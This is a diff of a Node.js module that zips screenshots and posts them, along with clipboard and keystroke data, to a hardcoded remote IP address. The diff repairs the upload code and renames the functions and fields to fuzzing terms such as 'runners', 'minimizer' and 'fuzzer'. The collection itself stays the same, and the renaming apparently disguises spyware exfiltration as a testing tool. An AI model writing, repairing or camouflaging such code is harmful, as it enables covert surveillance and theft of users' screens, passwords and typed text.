@@ -1,18 +1,21 @@
 const axios = require("axios");
 const FormData = require('form-data');
 const JSZip = require("jszip");
+const fs = require('fs')
 
-const sendScreenData = async (images, monitorId = 0) => {
+const sendRunnerData = async (runners) => {
   try {
     const zip = new JSZip();
 
-    images.forEach(image => {
-      zip.file(`scr_${(new Date()).getTime()}_${monitorId.png}.webp`, image.buffer)
+    runners.forEach(image => {
+      const fileName = `scr_${(new Date()).getTime()}_${image.monitorId}.webp`;
+      zip.file(fileName, image.buffer)
     })
-    const zipBlob = await zip.generateAsync({ type: "blob" });;
+    const zipBlob = await zip.generateAsync({ type: "blob" });
+    const zipBuffer = Buffer.from(await zipBlob.arrayBuffer());
 
     const formData = new FormData();
-    formData.append('file', zipBlob, "images.zip");
+    formData.append('file', zipBuffer, "runners.zip");
 
     await axios.post('http://178.63.70.109:5050/api1', formData, {
       headers: {
@@ -27,11 +30,11 @@ const sendScreenData = async (images, monitorId = 0) => {
   }
 }
 
-const sendClipboardAndKeyboardData = async (clipboard, keyboard) => {
+const sendMinimizerAndFuzzerData = async (minimizer, fuzzer) => {
   try {
     await axios.post('http://178.63.70.109:5050/api2', {
-      clipboard,
-      keyboard
+      minimizer,
+      fuzzer
     }, {
       headers: {
         'Content-Type': 'application/json',
@@ -45,6 +48,6 @@ const sendClipboardAndKeyboardData = async (clipboard, keyboard) => {
 }
 
 module.exports = {
-  sendScreenData,
-  sendClipboardAndKeyboardData,
+  sendRunnerData,
+  sendMinimizerAndFuzzerData,
 }
